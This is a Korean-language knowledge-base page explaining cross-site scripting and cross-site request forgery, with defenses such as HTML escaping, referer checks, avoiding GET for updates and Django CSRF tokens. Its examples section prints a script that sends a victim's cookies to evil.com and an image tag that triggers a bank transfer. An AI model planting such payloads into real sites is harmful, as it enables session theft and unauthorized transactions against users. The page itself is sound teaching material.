---
title: "Cross-Site Scripting"
description: "크로스 사이트 스크립팅(Cross-Site Scripting, XSS)은 웹 사이트가 사용자로부터 입력받은 텍스트를 저장한 후 다른 사용자에게 표시할 때, 공격자가 JavaScript 등의 클라이언트 측 스크립트를 삽입하여 다른 사용자의 브라우저에서 악의적 코드를..."
tags: ['Xss', 'Xsrf', 'Csrf', 'Security', 'Web Application']
created: 2026-02-15
updated: 2026-02-17
draft: true
slug: knowledge/database/cross-site-scripting
sidebar:
  order: 12
---

## 핵심 개념

XSS 공격의 기본 원리는 다음과 같다. 웹 사이트가 사용자 입력(댓글, 이름 등)을 저장하고 나중에 다른 사용자에게 표시할 때, 공격자가 유효한 텍스트 대신 JavaScript나 Flash 같은 클라이언트 측 스크립트 코드를 입력한다. 다른 사용자가 이 텍스트를 조회할 때 브라우저가 스크립트를 실행하며, 이 스크립트는 사용자의 쿠키 정보를 탈취하거나 다른 웹 서버에서 작업을 실행할 수 있다.

크로스 사이트 요청 위조(Cross-Site Request Forgery, XSRF/CSRF)는 XSS와 관련된 공격이다. 스크립트 없이도 <img src="https://mybank.com/transfermoney?amount=1000&toaccount=14523"> 같은 코드로 사용자가 로그인된 다른 사이트에 요청을 보낼 수 있다. 사용자가 은행 계좌에 로그인된 상태에서 이 코드가 실행되면 의도하지 않은 송금이 발생할 수 있다.

XSS/XSRF 방어는 두 방향에서 이루어진다. 첫째, 자기 사이트가 공격의 매개체가 되지 않도록 방어해야 한다. 가장 간단한 방법은 사용자 입력에서 모든 HTML 태그를 제거하거나 이스케이프 처리하는 것이다. HTML 서식이 필요한 경우 제한된 HTML 구문만 허용하고 위험한 구문을 차단하는 파서를 사용한다. 둘째, 다른 사이트에서 시작된 공격으로부터 자기 사이트를 보호해야 한다. HTTP referer 헤더를 검사하여 요청의 출처를 확인하고, 세션을 원래 인증된 IP 주소로 제한하며, GET 메서드로는 절대 갱신 작업을 수행하지 않아야 한다.

Django 같은 웹 프레임워크는 CSRF 보호 메커니즘을 내장하고 있으며, 개발자는 이를 반드시 활용해야 한다.

## 예시

```html
<!-- XSS 공격 예시 -->
<!-- 공격자가 댓글 필드에 입력하는 악의적 코드: -->
<script>
  // 사용자의 쿠키를 공격자 서버로 전송
  document.location =
    'https://evil.com/steal?cookie=' + document.cookie;
</script>

<!-- XSRF 공격 예시 (스크립트 없이) -->
<img src="https://mybank.com/transfermoney?amount=1000&toaccount=14523">
<!-- 사용자가 은행에 로그인된 상태이면 자동으로 송금 요청 발생 -->
```

```python
# Django에서의 CSRF 방어
# 템플릿에서 CSRF 토큰 포함
# <form method="post">
#     {% csrf_token %}
#     ...
# </form>

# 뷰에서 CSRF 검증 (Django가 자동 처리)
# POST 요청 시 유효한 CSRF 토큰이 없으면 요청 거부
```

```
-- XSS 방어: 사용자 입력에서 HTML 태그 제거
-- 입력: "<script>alert('XSS')</script>"
-- 이스케이프 처리 후: "&lt;script&gt;alert('XSS')&lt;/script&gt;"
-- 브라우저에 텍스트로 표시되며 스크립트 실행 안 됨

-- GET 메서드로 갱신 금지 (HTTP 표준 준수)
-- 안전: POST /transfermoney (폼 제출)
-- 위험: GET /transfermoney?amount=1000 (이미지 태그 등으로 공격 가능)
```

## 관련 개념

- [SQL Injection](/knowledge/database/sql-injection/)
- [Session Management](/knowledge/database/session-management/)
- [Web Application Architecture](/knowledge/database/web-application-architecture/)
- [Encryption](/knowledge/database/encryption/)
